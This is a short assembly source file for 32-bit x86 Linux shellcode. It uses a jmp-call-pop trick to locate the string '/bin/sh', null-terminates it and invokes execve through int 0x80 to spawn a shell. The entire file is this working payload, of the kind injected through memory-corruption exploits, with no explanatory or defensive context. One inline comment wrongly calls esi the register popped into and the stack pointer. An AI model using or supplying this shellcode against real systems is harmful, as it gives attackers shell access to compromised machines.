BITS 32


; zero out registers
xor		eax,eax
xor		ebx,ebx
xor		ecx,ecx
cdq				; convert dword in eax to qword in edx
; do the 'string trick'
jmp short string

code:
pop		ebx		; pop the addr of the string intro esi (stack pointer register)
mov byte	[ebx + 7], al	; null-terminate the string
mov		al,0xb		; syscall number 0xb (11) is execve
int		0x80		; let the kernel do the stuff

string:
call code
db '/bin/sh'
